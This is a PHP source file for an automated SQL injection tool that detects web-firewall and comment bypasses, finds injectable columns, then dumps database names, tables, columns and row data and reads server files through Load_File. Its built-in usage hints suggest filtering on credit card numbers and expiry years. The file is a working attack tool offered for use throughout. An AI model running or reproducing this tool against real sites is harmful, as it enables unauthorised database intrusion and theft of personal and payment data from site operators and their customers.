<?php
	set_time_limit(0);
	require("function_class.php");
	
	###### process input ######
	foreach($_REQUEST as $key => $value)
	{
		${$key} = $value;
	}
	$url = cleanUpUrl($url);
	
	//xu li so column
	$count = array();
	for($i=0; $i<$countColumn; $i++)
	{
		$count[$i]=$i+1;
	}


	###########################
	
	if($op == 1)
	{
		//get version
		$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Version(),0x2c2c,User(),0x2c2c,Database(),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
		$info = new CExploit();
		$info->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);//exit($info->url);
		$info->page = getPage($info->url);//exit($info->page);
		preg_match("/:::(.*?):::/",$info->page,$info->result);
		$result = explode(",,",$info->result[1]);
		echo "version() : ".$result[0]."<br>";ob_flush();flush();
		echo "user() : ".$result[1]."<br>";ob_flush();flush();
		echo "database() : ".$result[2]."<br>";ob_flush();flush();
		
		$user = $result[1];
		$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,(Select file_priv From mysql.user Where user=".ascii_mysql(str_replace(strrchr($user,"@"),"",$result[1]))."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
		$info->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);//exit($info->url);
		$info->page = getPage($info->url);
		preg_match("/:::(.*?):::/",$info->page,$info->result);
		if($info->result[1] == "")
		{
			$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,(Select IS_GRANTABLE From Information_Schema. USEr_PRIVILEGES Where PRIVILEGE_TYPE=".ascii_mysql("FILE")." And GRANTEE=".ascii_mysql("'".str_replace("@","'@'",$user)."'")."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
			$info->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);//exit($info->url);
			$info->page = getPage($info->url);
			preg_match("/:::(.*?):::/",$info->page,$info->result);	
		}
		
		if($info->result[1] != "")
		{
			echo "file_priv : ".$info->result[1]."<br>";ob_flush();flush();
		}
		else
		{
			echo "file_priv : unknow<br>";ob_flush();flush();
		}

		//get dbs
		if($useGroupConcat == 1)
		{
			$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Substr(Group_Concat(Schema_Name),1,10000),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


			$info->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." From Information_Schema. Schemata".$arrSecBypass[$secBypass][1]." ".$commentBypass);
				
			//exit($info->url);
			$info->page = getPage($info->url) or die("time out");
			preg_match("/:::(.*?):::/",$info->page,$info->result);




			$dbs = explode(",",$info->result[1]);


			echo "<select multiple id='dbs' size=10>";
			foreach($dbs as $tmp)
			{
				if($tmp != "")
					echo "<option value='".$tmp."'>".$tmp."</option>";ob_flush();flush();
			}
			echo "</select><br/>
				  <input type='submit' value='get table' onClick='exploit1(2);autoFill(\"dbs\",\"dbGetData\")' />";
		}
		else
		{
			echo "<select multiple id='dbs' size=10>";
			$info->result[1] = 1;$info->i = 0;
			while(str_replace("|","",$info->result[1])!="")
			{
				
				$q = "(Select Schema_Name From Information_Schema. Schemata Limit ".$info->i.",1)";
				for($i=1;$i<$speed;$i++)
				{
					$q .= ",(Select Schema_Name From Information_Schema. Schemata Limit ".($info->i+$i).",1)";
				}

				$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,concat_Ws(0x2c,".$q."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


				$info->url = _urlEncode($url."+".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
				//exit("</select>".$info->url);

				$info->page = getPage($info->url) or die("</select>time out");
				if(preg_match("/:::(.*?):::/",$info->page,$info->result))
				{
					$result = explode(",",$info->result[1]);
					for($i=0;$i<$speed;$i++)
					{
						if($result[$i])
						{
							echo "<option value='".$result[$i]."'>".$result[$i]."</option>";ob_flush();flush();
						}
					}
				}
				$info->i += $speed;
			}
			echo "</select><br/>
				  <input type='submit' value='get table' onClick='exploit1(2);autoFill(\"dbs\",\"dbGetData\")' />";
		}
	}
	elseif($op == "2")
	{
		echo "Database : ".$db."<br/><br/>";ob_flush();flush();
		if($useGroupConcat == 1)
		{
			$table = new CExploit();



			$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Substr(Group_Concat(Table_Name),1,10000),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


			$table->url = _urlEncode($url."+".$arrSecBypass[$secBypass][0].join(",",$count)." From Information_Schema. Tables Where Table_Schema=".ascii_mysql($db)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
			//exit($table->url);
				
			$table->page = getPage($table->url) or die("time out");
			preg_match("/:::(.*?):::/",$table->page,$table->result);
			$tables = explode(",",$table->result[1]);


			echo "<select multiple id='tables' size=10>";
			foreach($tables as $tmp)
			{
				if($tmp != "")
					echo "<option value='".$tmp."'>".$tmp."</option>";ob_flush();flush();
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='submit' value='get column' onClick='exploit1(3);autoFill(\"tables\",\"tableGetData\")' />";
		}
		else
		{
			echo "<select multiple id='tables' size=10>";
			$table->result[1] = 1;$table->i = 0;
			while(str_replace("|","",$table->result[1])!="")
			{
				$q = "(Select Table_Name From Information_Schema. Tables Where Table_Schema=".ascii_mysql($db)." Limit ".$table->i.",1)";
				for($i=1;$i<$speed;$i++)
				{
					$q .= ",(Select Table_Name From Information_Schema. Tables Where Table_Schema=".ascii_mysql($db)." Limit ".($table->i+$i).",1)";
				}

				$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Concat_Ws(0x2c,".$q."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


				$table->url = _urlEncode($url."+".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);

				//exit("</select>".$table->url);
				$table->page = getPage($table->url) or die("</select>time out");
				if(preg_match("/:::(.*?):::/",$table->page,$table->result))
				{
					$result = explode(",",$table->result[1]);
					for($i=0;$i<$speed;$i++)
					{
						if($result[$i])
						{
							echo "<option value='".$result[$i]."'>".$result[$i]."</option>";ob_flush();flush();
						}
					}
				}
				$table->i += $speed;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='submit' value='get column' onClick='exploit1(3);autoFill(\"tables\",\"tableGetData\")' />";
		}
	}
	elseif($op == "3")
	{
		echo "Database : ".$db."<br/>Table : ".$table."<br/>";ob_flush();flush();
		if($useGroupConcat == 1)
		{
			$column = new CExploit();
			$listColumn = "";


			$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Substr(Group_Concat(Column_Name),1,10000),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


			$column->url = _urlEncode($url.$arrSecBypass[$secBypass][0].join(",",$count)." From Information_Schema. Columns Where Table_Schema=".ascii_mysql($db)." And Table_Name=".ascii_mysql($table)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
			//exit($column->url);

				$column->page = getPage($column->url) or die("time out");
				if(preg_match("/:::(.*?):::/",$column->page,$column->result))
				{
					$columns .= $column->result[1].",";
				}
				$column->i += $strlen;



			$columns = explode(",",$columns);
			
			echo "<select multiple id='columns' size=10>";
			foreach($columns as $tmp)
			{
				if($tmp != "")
				{
					echo "<option value='".$tmp."'>".$tmp."</option>";ob_flush();flush();
					$listColumn .= $tmp."\n";
				}
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='hidden' id='tableExploit' value='".$table."' />
				  <input type='submit' value='get id' onClick='exploit1(6);autoFill(\"columns\",\"columnFilterGetData\")' />
				  <input type='submit' value=\"don't have columnID\" onClick='exploit1(5)' />
				  <input type='hidden' id='listColumn' value='".$listColumn."' />
				  <input type='submit' value='showListColumn' onClick='autoFill(\"listColumn\",\"listColumnGetData\")' />";
		}
		else
		{
			echo "<select multiple id='columns' size=10>";
			$column->result[1] = 1;$column->i = 0;$listColumn = "";
			while(str_replace("|","",$column->result[1])!="")
			{
				$q = "(Select Column_Name From Information_Schema. Columns Where Table_Schema=".ascii_mysql($db)."And Table_Name=".ascii_mysql($table)." Limit ".$column->i.",1)";
				for($i=1;$i<$speed;$i++)
				{
					$q .= ",(Select Column_Name From Information_Schema. Columns Where Table_Schema=".ascii_mysql($db)."And Table_Name=".ascii_mysql($table)." Limit ".($column->i+$i).",1)";
				}

				$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Concat_Ws(0x2c,".$q."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];


				$column->url = _urlEncode($url."+".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);

				//exit($column->url);
				$column->page = getPage($column->url) or die("</select>time out");
				if(preg_match("/:::(.*?):::/",$column->page,$column->result))
				{
					$result = explode(",",$column->result[1]);
					for($i=0;$i<$speed;$i++)
					{
						if($result[$i])
						{
							echo "<option value='".$result[$i]."'>".$result[$i]."</option>";ob_flush();flush();
							$listColumn .= $result[$i]."\r\n";
						}
					}
				}
				$column->i += $speed;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='hidden' id='tableExploit' value='".$table."' />
				  <input type='submit' value='get id' onClick='exploit1(6);autoFill(\"columns\",\"columnFilterGetData\")' />
				  <input type='submit' value=\"don't have columnID\" onClick='exploit1(5)' />
				  <input type='hidden' id='listColumn' value='".$listColumn."' />
				  <input type='submit' value='showListColumn' onClick='autoFill(\"listColumn\",\"listColumnGetData\")' />";
		}
	}
	elseif($op == "4")
	{
		$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a3a3a3a,Load_File(".ascii_mysql($file)."),0x3a3a3a3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
		$cfile = new CExploit();
		$cfile->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
		//exit($cfile->url);
		$cfile->page = str_replace("\n","vndarkcode",getPage($cfile->url)) or die("time out");
		//exit($cfile->page);
		preg_match("/::::::(.*?)::::::/",$cfile->page,$cfile->result);
		echo "<form action='' method='GET'>";
		foreach($_REQUEST as $key => $value)
		{
			if($key != "file")
				echo "<input type='hidden' name='".$key."' value=\"".$value."\">
			";
		}
		echo "<input type='text' size=100 name='file' value='".$file."'>
			  <input type='submit' value='load'>
		      </form>
			  ";
		echo "<textarea cols=192 rows=100>".str_replace("vndarkcode","\r\n",$cfile->result[1])."</textarea>";
	}
	elseif($op == "5")
	{
		$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Count(*),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
		$id = new CExploit();
		$id->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." From ".$db.".".$table." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
		//exit($id->url);
		$id->page = getPage($id->url) or die("time out");
		preg_match("/:::(.*?):::/",$id->page,$id->result);
		?>
		<input type="hidden" id="columnFilterGetData" value="">
		<table>
			<tr><td>Count records</td><td><input type="text" value="<?php echo $id->result[1]; ?>" /></td></tr>
			<tr><td>From record</td><td><input type="text" id="from" size="5" value=1 /></td></tr>
			<tr><td>To record</td><td><input type="text" id="to" size="5" value="<?php echo $id->result[1]; ?>"/></td></tr>
		</table>
		how to use ? example : <br/>
		cc_number>0<br/>
		cc_expyear>2010<br/>
		....<br/>
		<textarea cols="20" rows="10" id="addition"></textarea>
		<?php
	}
	elseif($op == "6")
	{
		$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Count(".$column."),0x2c,Max(".$column."),0x2c,Min(".$column."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
		$id = new CExploit();
		$id->url = _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." From ".$db.".".$table." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
		//exit($id->url);
		$id->page = getPage($id->url) or die("time out");
		preg_match("/:::(.*?):::/",$id->page,$id->result);
		$result = explode(",",$id->result[1]);
		echo "count(".$column.") : ".$result[0]."<br/>";ob_flush();flush();
		echo "max(".$column.") : ".$result[1]."<br/>";ob_flush();flush();
		echo "min(".$column.") : ".$result[2]."<br/>";ob_flush();flush();
		?>
		<table>
			<tr><td>Filter by column</td><td><input type="text" value="<?php echo $column; ?>" id="columnFilterGetData"/></td></tr>
			<tr><td>From</td><td><input type="text" id="from" size="5" value="<?php echo $result[2]; ?>" /></td></tr>
			<tr><td>To</td><td><input type="text" id="to" size="5" value="<?php echo $result[1]; ?>"/></td></tr>
		</table>
		how to use ? example : <br/>
		cc_number>0<br/>
		cc_expyear>2010<br/>
		....<br/>
		<textarea cols="20" rows="10" id="addition"></textarea>
		<?php
	}
	elseif($op == "7")
	{
		$temp = explode("abc2",$listColumnGetData);
		$listColumnGetData = "";
		$i=1;
		foreach($temp as $tmp)
		{
			if($tmp != "")
				$listColumnGetData .= ($listColumnGetData == "")?$tmp:",".$tmp;
			if($tmp == $columnFilterGetData)
				$orderBy = $i;
			$i++;
		}

		$temp = explode("abc2",$addition);
		$addition = "";
		foreach($temp as $tmp)
			if($tmp != "")
				$addition .= " And ".$tmp;

		$data = new CExploit();
		$data->i = 0;$data->result[0]=1;
		if(is_null($speed)) $speed = 1;
		if($columnFilterGetData)
		{
			while($data->i<=($to-$from))
			{
				$q = "(Select Concat_Ws(Char (32,124,32),".$listColumnGetData.")"." From ".$db.".".$table." Where ".$columnFilterGetData.">=".$from." And ".$columnFilterGetData."<=".$to.$addition." Order By ".$orderBy." Asc Limit ".$data->i.",1)";
				for($i=1;$i<$speed;$i++)
				{
					$q .= ",(Select Concat_Ws(Char (32,124,32),".$listColumnGetData.")"." From ".$db.".".$table." Where ".$columnFilterGetData.">=".$from." And+".$columnFilterGetData."<=".$to.$addition." Order By ".$orderBy." Asc Limit ".($data->i+$i).",1)";
				}
				
				$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Concat_Ws(0x2c2c,".$q."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
				$data->url= _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
				//echo $data->url."<br>";ob_flush();flush();
				$data->page = getPage($data->url) or die("time out");
				if(preg_match("/:::(.*?):::/",$data->page,$data->result))
				{
					$result = explode(",,",$data->result[1]);
					for($i=0;$i<$speed;$i++)
					{
						if($result[$i])
						{
							echo $result[$i]."<br>";ob_flush();flush();
						}
						else
						{
							echo "null <br>";ob_flush();flush();
						}
					}
				}
				$data->i += $speed;
			}
		}
		else
		{
			while($data->i<=($to-$from))
			{
				$q = "(Select Concat_Ws(Char (32,124,32),".$listColumnGetData.")"." From ".$db.".".$table." Where 1 ".$addition." Limit ".$data->i.",1)";
				for($i=1;$i<$speed;$i++)
				{
					$q .= ",(Select Concat_Ws(Char (32,124,32),".$listColumnGetData.")"." From ".$db.".".$table." Where 1 ".$addition." Limit ".($data->i+$i).",1)";
				}
				
				$count[$exploitColumn-1] = $arrEncodeBypass[$encodeBypass][0]."(Concat(0x3a3a3a,Concat_Ws(0x2c2c,".$q."),0x3a3a3a))".$arrEncodeBypass[$encodeBypass][1];
				$data->url= _urlEncode($url." ".$arrSecBypass[$secBypass][0].join(",",$count)." ".$arrSecBypass[$secBypass][1]." ".$commentBypass);
				//echo $data->url."<br>";ob_flush();flush();
				$data->page = getPage($data->url) or die("time out");
				if(preg_match("/:::(.*?):::/",$data->page,$data->result))
				{
					$result = explode(",,",$data->result[1]);
					for($i=0;$i<$speed;$i++)
					{
						if($result[$i])
						{
							echo $result[$i]."<br>";ob_flush();flush();
						}
						else
						{
							echo "null <br>";ob_flush();flush();
						}
					}
				}
				$data->i += $speed;
			}
		}
	}
	elseif($op == "0")
	{
		$url = str_replace("'","",$url);
		$url = str_replace('"',"",$url);
		$url = str_replace("=-","=",$url);
		echo "[+]Loading . . .<br>";ob_flush();flush();

		//check bypass mod_security
		for($i=0;$i<count($arrSecBypass);$i++)
		{
			$SecPage = getPage(_urlEncode($url." ".$arrSecBypass[$i][0]." 1 ".$arrSecBypass[$i][1]."-- a"));
			$SecPage = strtolower($SecPage);
			if(!(strpos($SecPage,"forbidden") && strpos($SecPage,"you don't have permission to access"))
			&& !(strpos($SecPage,"500 internal server error")) && !(strpos($SecPage,"not acceptable")))
			{
				$secBypass = $i;
				break;
			}
		}
		if(is_null($secBypass))
		{
			$secBypass = 0;
		}

		//exit("a".$secBypass);
		echo "[+]option 1 => ok";ob_flush();flush();
		

		//detect comment bypass
		for($i=0;$i<count($arrCommentBypass);$i++)
		{
			echo " .";ob_flush();flush();
			$page1 = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$i][0]." Order By 1 ".$arrCommentBypass[$i][1])));
			$a1 = explode("vndarkcode",$page1);
			//echo _urlEncode($url." ".$arrCommentBypass[$i][0]." Order By 1 ".$arrCommentBypass[$i][1])."<br>";ob_flush();flush();

			$page9999 = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$i][0]." Order By 9999 ".$arrCommentBypass[$i][1])));
			//exit($page9999);
			$a9999 = explode("vndarkcode",$page9999);

			$page10000 = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$i][0]." Order By 10000 ".$arrCommentBypass[$i][1])));
			$a10000 = explode("vndarkcode",$page10000);
			
			
			
			if(check($a1,$a9999,$a10000) == -1)
			{
				$commentBypass = $i;
				break;
			}
		}
		
		//exit("a".$commentBypass);
		if(!is_null($commentBypass))
		{
			echo "<br>[+]option 2 => ok";ob_flush();flush();
		}
		else
		{
			exit("<br>[-]option 2 => fail");
		}

		//count Column
		$arrs = array(
			array(1,20,40),
			array(40,60,80)
			);
		$page1 = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$commentBypass][0]." Order By 1 ".$arrCommentBypass[$commentBypass][1])));
		$a1 = explode("vndarkcode",$page1);

		$page10000 = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$commentBypass][0]." Order By 10000 ".$arrCommentBypass[$commentBypass][1])));
		$a10000 = explode("vndarkcode",$page10000);
		foreach($arrs as $arr)
		{
			$max = $arr[2];
			
			while(1)
			{
				echo " .";ob_flush();flush();
				$page = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$commentBypass][0]." Order By ".$arr[1]." ".$arrCommentBypass[$commentBypass][1])));
				//echo $url." ".$arrCommentBypass[$commentBypass][0]." Order By ".$arr[1]." ".$arrCommentBypass[$commentBypass][1]."<br>";ob_flush();flush();
				$a = explode("vndarkcode",$page);

				if(check($a1,$a,$a10000) == 1)
				{	
					$arr[0] = $arr[1];
					$arr[1] = round(($arr[0] + $arr[2])/2);
				}
				elseif(check($a1,$a,$a10000) == -1)
				{
					$arr[2] = $arr[1];
					$arr[1] = round(($arr[0] + $arr[2])/2);
				}
				else
				{
					exit("<br>[-]option 3 => fail");
				}

				if(($arr[2] - $arr[0]) == 1)
				{
					$page = cleanUpPage(getPage(_urlEncode($url." ".$arrCommentBypass[$commentBypass][0]." Order By ".$arr[2]." ".$arrCommentBypass[$commentBypass][1])));
					$a = explode("vndarkcode",$page);
					if(check($a1,$a,$a10000) == 1)
					{	
						if($arr[2] != $max)
						{
							$countColumn = $arr[2];
							break;
						}
						else
						{
							break;
						}
					}
					elseif(check($a1,$a,$a10000) == -1)
					{
						$countColumn = $arr[0];
						break;
					}
				}
			}
			if($countColumn)
			{
				echo "<br>[+]option 3 => ok";ob_flush();flush();
				break;
				//exit("A".$countColumn);
			}
		}

		//get exploitColumn
		$count = array();
		for($i=0; $i<$countColumn; $i++)
		{
			$count[$i] = "Concat(0x3a3a3a,".($i+1).",0x3a3a3a)";
		}
		$arrs = array();
		array_push($arrs,str_replace("=","=-",strrchr($url,"=")));
		array_push($arrs,strrchr($url,"=")." And 1=0 ");
		array_push($arrs,strrchr($url,"="));
		array_push($arrs,"=null");
		

		foreach($arrs as $arr)
		{
			echo " .";ob_flush();flush();
			$url = str_replace(strrchr($url,"="),$arr,$url);
			//echo _urlEncode($url.$arrCommentBypass[$commentBypass][0].$arrSecBypass[$secBypass][0].join(",",$count).$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass][1])."<br>";;ob_flush();flush();

			$page = getPage(_urlEncode($url.$arrCommentBypass[$commentBypass][0].$arrSecBypass[$secBypass][0].join(",",$count).$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass][1]));
			
			if(preg_match("/:::(.*?):::/",$page,$result))
			{
				echo "<br>[+]option 4 => ok<br>";ob_flush();flush();
				$exploitColumn = intval($result[1]);
				break;
			}
		}

		if(is_null($exploitColumn))
		{
			exit($countColumn."[-]option 4 => fail<br>");
		}


		//encode bypass
		$count = array();
		for($i=0; $i<$countColumn; $i++)
		{
			$count[$i] = $i+1;
		}
		for($i=0;$i<count($arrEncodeBypass);$i++)
		{
			echo " . ";ob_flush();flush();
			$count[$exploitColumn-1] = $arrEncodeBypass[$i][0]."Concat(0x3a3a3a,(Version()),0x3a3a3a)".$arrEncodeBypass[$i][1];			
			$page = getPage(_urlEncode($url.$arrCommentBypass[$commentBypass][0].$arrSecBypass[$secBypass][0].join(",",$count).$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass][1]));
			if(preg_match("/:::(.*?):::/",$page))
			{
				echo "[*]DONE<br>
					  [*]You can click \"START\" button<br>";
				$encodeBypass = $i;
				break;
			}
		}
		//exit("A".$encodeBypass);
		if(preg_match("/\'/",$arrCommentBypass[$commentBypass][0]))
			echo 'Link : <input type="text" id="url" value="'.$url.$arrCommentBypass[$commentBypass][0].'" size="70"/>'; 
		elseif(preg_match("/\"/",$arrCommentBypass[$commentBypass][0]))
			echo "Link : <input type='text' id='url' value='".$url.$arrCommentBypass[$commentBypass][0]."' size='70'/>";
		else
			echo 'Link : <input type="text" id="url" value="'.$url.$arrCommentBypass[$commentBypass][0].'" size="70"/>'; 
		?> 
		
		<input type="text" id="countColumn" size=2 value="<?php echo $countColumn; ?>"/>
		<input type="text" id="exploitColumn" size=2 value="<?php echo $exploitColumn; ?>"/>
		<select id="commentBypass">
			<?php
			for($i=0;$i<5;$i++)
			{
				if($arrCommentBypass[$i][1] == $arrCommentBypass[$commentBypass][1])
				{
						echo "<option value='".$arrCommentBypass[$i][1]."' selected>".urldecode($arrCommentBypass[$i][1])."</option>";
				}
				else
				{
					echo "<option value='".$arrCommentBypass[$i][1]."'>".urldecode($arrCommentBypass[$i][1])."</option>";
				}
			}
			?>
		</select><br/>
		

		<input type="hidden" id="secBypass" value="<?php echo $secBypass; ?>">
		<table>
		<tr>
			<td><input type="radio" id="encodeBypass_0" name="encodeBypass" <?php if($encodeBypass==0) { echo "checked"; }?>></td><td> none </td>
			<td><input type="radio" id="useGroupConcat_0" name="useGroupConcat" onclick="enable();" checked></td><td> speed : <input type="text" value=1 id="speed" size=2></td>
		</tr>
		<tr>
			<td><input type="radio" id="encodeBypass_1" name="encodeBypass" <?php if($encodeBypass==1) { echo "checked"; }?>></td><td> unhex(hex())</td>
			<td><input type="radio" id="useGroupConcat_1" name="useGroupConcat" onclick="enable();"></td><td> use group_concat</td>
		</tr>
		<tr>
			<td></td><td></td>
			<td><input type="radio" id="encodeBypass_2" name="encodeBypass" <?php if($encodeBypass==2) { echo "checked"; }?>></td><td> CONVERT("something" USING latin1)</td>
			<td></td><td><input type="submit" value="AUTO DETECT" onClick="exploit1(0)" /><input type="submit" value="START" onClick="exploit1(1)" /></td>
		</tr>
		</table>
		<?php
		exit();
	}
?>